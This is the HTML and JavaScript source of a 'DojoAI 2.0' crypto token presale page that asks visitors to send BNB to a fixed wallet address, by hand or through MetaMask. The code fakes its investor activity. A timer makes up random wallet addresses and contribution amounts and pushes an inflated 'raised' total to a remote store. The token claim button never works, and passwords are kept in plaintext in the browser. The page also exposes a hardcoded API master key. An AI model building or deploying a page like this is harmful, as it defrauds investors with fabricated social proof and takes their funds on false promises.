<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Welcome to DojoAI Presale</title>
  <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;700&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Rajdhani', sans-serif;
      background-color: #0e0e0e;
      color: #f0f0f0;
      text-align: center;
      padding: 20px;
    }
    .container {
      max-width: 700px;
      margin: auto;
      padding: 30px;
      background-color: #1a1a1a;
      border-radius: 12px;
      box-shadow: 0 0 20px #00ffc3;
    }
    h1 {
      color: #00ffc3;
      font-weight: 700;
    }
    #description {
      font-size: 16px;
      color: #bbb;
      margin: 20px 0 30px;
      line-height: 1.6;
    }
    #countdown {
      font-size: 24px;
      margin: 20px 0;
    }
    .wallet-section, .login-register {
      margin-top: 30px;
    }
    .wallet-address {
      background: #222;
      padding: 10px;
      border-radius: 8px;
      margin: 10px 0;
      word-break: break-all;
    }
    .qr-code {
      margin-top: 10px;
      width: 150px;
    }
    button {
      background: #00ffc3;
      color: #000;
      padding: 10px 20px;
      font-weight: bold;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      margin-top: 10px;
    }
    input {
      padding: 10px;
      width: 90%;
      border: none;
      margin: 5px 0;
      border-radius: 6px;
    }
    .stats {
      margin-top: 30px;
      font-size: 16px;
      color: #aaa;
    }
    .progress {
      background: #333;
      border-radius: 10px;
      height: 25px;
      margin-top: 10px;
      overflow: hidden;
    }
    .progress-bar {
      background: #00ffc3;
      height: 100%;
      width: 0%;
      transition: width 1s ease;
    }
    .investors {
      text-align: left;
      margin-top: 30px;
      font-size: 14px;
      color: #ccc;
      height: 120px;
      overflow-y: auto;
      background: #111;
      padding: 10px;
      border-radius: 8px;
    }
    .join-section {
      margin-top: 30px;
    }
    .contact {
      margin-top: 30px;
      font-size: 15px;
      color: #aaa;
    }
    a {
      color: #00ffc3;
    }
    .balance-display, .token-claim {
      margin-top: 20px;
      font-size: 15px;
      color: #0f0;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>üëã Welcome to DojoAI Presale</h1>
    <div class="login-register">
      <h3>Login or Create Your Account to Continue</h3>
      <input type="text" id="username" placeholder="Username" /><br />
      <input type="password" id="password" placeholder="Password" /><br />
      <button onclick="login()">Login</button>
      <button onclick="register()">Register</button>
    </div>

    <div class="container" id="mainContent" style="display: none;">
      <h1>üöÄ DojoAI 2.0 Presale</h1>
      <div id="description">
        DojoAI 2.0 is a revolutionary AI project integrating decentralized trading algorithms with blockchain automation. This presale offers early access to our native token before official exchange listings. All funds raised go toward protocol development, strategic partnerships, and liquidity. Token claims will be available after the presale ends on August 1st based on BNB contributed.
      </div>

      <div id="countdown">Countdown Loading...</div>

      <div class="stats">
        <p>Soft Cap: 50 BNB | Hard Cap: 200 BNB</p>
        <p>Raised: <span id="fakeRaised">0</span> BNB</p>
        <div class="progress">
          <div class="progress-bar" id="progressBar"></div>
        </div>
      </div>

      <div class="balance-display">
        Your Contribution: <span id="userBNB">0.000</span> BNB<br />
        Estimated Token Allocation: <span id="userDOJO">0</span> DOJO
      </div>

      <div class="investors" id="investorList"></div>

      <div class="join-section">
        <h3>Ready to Join?</h3>
        <p>Send BNB to the wallet below. Token claims will be unlocked on August 1st based on your BNB sent.</p>
        <div class="wallet-address" id="walletAddress">0x2Eb0b86bA0a09A04BE034150b3ad3A306D847918</div>
        <img src="dojoai_bnb_qr.png" alt="BNB QR Code" class="qr-code" />
        <button onclick="copyWallet()">üìã Copy Address</button>
        <button onclick="connectAndSend()">üîå Send BNB with MetaMask</button>
      </div>

      <div class="token-claim">
        <button disabled>Claim DOJO Tokens (Opens Aug 1)</button>
      </div>

      <div class="contact">
        Token distribution begins August 1st. For inquiries, DM us on X: <strong>@DojoAI 2.0 Presale</strong><br />
        View source code: <a href="https://github.com/dojoai-dev/dojoai-presale" target="_blank">GitHub Repo</a>
      </div>
    </div>
  </div>

  <script>
    const BIN_ID = "68726140765a380a7395fa54";
    const API_KEY = "$2a$10$PrwJqaA0CInQDwUcVoukmesOKwbFkvrKvgbESnI82d0Ts4V/A/Xle";
    const ENDPOINT = `https://api.jsonbin.io/v3/b/${BIN_ID}`;

    const countdown = document.getElementById("countdown");
    const investorList = document.getElementById("investorList");
    const progressBar = document.getElementById("progressBar");
    const raisedDisplay = document.getElementById("fakeRaised");
    const userBNB = document.getElementById("userBNB");
    const userDOJO = document.getElementById("userDOJO");

    const targetDate = new Date("2025-08-01T00:00:00Z").getTime();

    function updateCountdown() {
      const now = new Date().getTime();
      const distance = targetDate - now;
      if (distance <= 0) {
        countdown.innerHTML = "‚õîÔ∏è Presale Ended";
        return;
      }
      const days = Math.floor(distance / (1000 * 60 * 60 * 24));
      const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
      const mins = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
      const secs = Math.floor((distance % (1000 * 60)) / 1000);
      countdown.innerHTML = `‚è≥ ${days}d ${hours}h ${mins}m ${secs}s remaining`;
    }

    async function fetchRaised() {
      const res = await fetch(ENDPOINT + "/latest", {
        headers: { 'X-Master-Key': API_KEY }
      });
      const data = await res.json();
      return parseFloat(data.record.raised || 0);
    }

    async function updateRaised(newValue) {
      await fetch(ENDPOINT, {
        method: "PUT",
        headers: {
          "Content-Type": "application/json",
          "X-Master-Key": API_KEY
        },
        body: JSON.stringify({ raised: newValue })
      });
    }

    function updateProgressUI(raised) {
      raisedDisplay.innerText = raised.toFixed(2);
      progressBar.style.width = (raised / 200) * 100 + "%";
    }

    function copyWallet() {
      const address = document.getElementById("walletAddress").innerText;
      navigator.clipboard.writeText(address).then(() => alert("BNB Address copied!"));
    }

    async function connectAndSend() {
      if (typeof window.ethereum !== 'undefined') {
        try {
          const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
          const from = accounts[0];
          const tx = await window.ethereum.request({
            method: 'eth_sendTransaction',
            params: [{
              from,
              to: "0x2Eb0b86bA0a09A04BE034150b3ad3A306D847918",
              value: "0x2386F26FC10000"
            }]
          });
          const userAmount = parseFloat(localStorage.getItem("contribution") || 0) + 0.01;
          localStorage.setItem("contribution", userAmount);
          updateUserStats(userAmount);
          alert("Transaction sent: " + tx);
        } catch (err) {
          alert("Error: " + err.message);
        }
      } else {
        alert("MetaMask not detected.");
      }
    }

    function updateUserStats(bnb) {
      userBNB.innerText = bnb.toFixed(3);
      userDOJO.innerText = Math.floor(bnb * 1000);
    }

    async function randomInvestor() {
      const address = "0x" + Math.random().toString(16).substr(2, 4) + "..." + Math.random().toString(16).substr(2, 4);
      const amount = (Math.random() * (1 - 0.01) + 0.01).toFixed(3);
      let raised = await fetchRaised();
      raised += parseFloat(amount);
      if (raised > 200) raised = 200;
      await updateRaised(raised);
      updateProgressUI(raised);
      const entry = document.createElement("div");
      entry.textContent = `${amount} BNB from ${address}`;
      investorList.prepend(entry);
    }

    function login() {
      const u = document.getElementById("username").value;
      const p = document.getElementById("password").value;
      const users = JSON.parse(localStorage.getItem("users") || "{}");
      if (!users[u]) return alert("‚ùå Username not found.");
      if (users[u] !== p) return alert("üîê Incorrect password.");
      document.querySelector(".login-register").style.display = "none";
      document.getElementById("mainContent").style.display = "block";
      const contribution = parseFloat(localStorage.getItem("contribution") || 0);
      updateUserStats(contribution);
    }

    function register() {
      const u = document.getElementById("username").value;
      const p = document.getElementById("password").value;
      const users = JSON.parse(localStorage.getItem("users") || "{}");
      if (users[u]) return alert("‚ö†Ô∏è Username already exists.");
      users[u] = p;
      localStorage.setItem("users", JSON.stringify(users));
      alert("‚úÖ Registration successful. You may now log in.");
    }

    updateCountdown();
    setInterval(updateCountdown, 1000);
    fetchRaised().then(updateProgressUI);
    setInterval(randomInvestor, 90000);
  </script>
</body>
</html>
